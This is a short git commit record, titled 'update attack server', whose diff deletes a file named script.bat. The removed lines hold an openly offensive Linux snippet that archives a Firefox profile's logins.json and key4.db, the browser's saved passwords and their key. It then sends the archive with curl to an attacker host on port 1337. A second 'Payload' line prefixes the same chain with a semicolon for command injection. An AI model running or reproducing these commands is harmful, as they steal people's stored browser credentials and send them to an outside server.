47ddde07dfc5d3bc82a7b8672c1d27a895cd010e
useristn <thanhnhatcyber@gmail.com>
2025-04-24 21:25:42 +0700

    update attack server

--- script.bat
+++
@@ -1,9 +0,0 @@
-===========================================   Linux   ============================================
-
-Shell:
-cd ~/.mozilla/firefox/*.default-esr
-tar czf /tmp/profile.tar.gz logins.json key4.db
-curl --data-binary "@/tmp/profile.tar.gz" -H "X-Filename: profile.tar.gz" ipv4_address:1337
-
-Payload:
-; cd ~/.mozilla/firefox/*.default-esr; tar czf /tmp/profile.tar.gz logins.json key4.db | curl --data-binary "@/tmp/profile.tar.gz" -H "X-Filename: profile.tar.gz" ipv4_address:1337
